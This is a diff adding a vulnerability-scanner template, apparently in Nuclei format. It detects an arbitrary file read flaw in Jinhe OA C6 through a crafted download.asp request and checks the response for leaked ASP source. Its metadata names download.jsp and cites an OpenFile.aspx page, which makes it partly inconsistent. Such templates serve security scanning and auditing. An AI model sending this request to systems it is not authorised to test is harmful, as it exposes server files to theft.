@@ -1,0 +1,29 @@
+id: jinheOA-download_asp-file-read
+
+info:
+  name: 金和OA C6 download.jsp 任意文件读取漏洞
+  author: cnaq
+  severity: medium
+  description: 金和OA C6 download.jsp文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20OpenFile.aspx%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
+  tags: jinheOA,download,file,read
+requests:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=download.asp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        condition: and
+        part: body
+        words:
+          - 'dim'
+          - '<%'
+          - '%>'
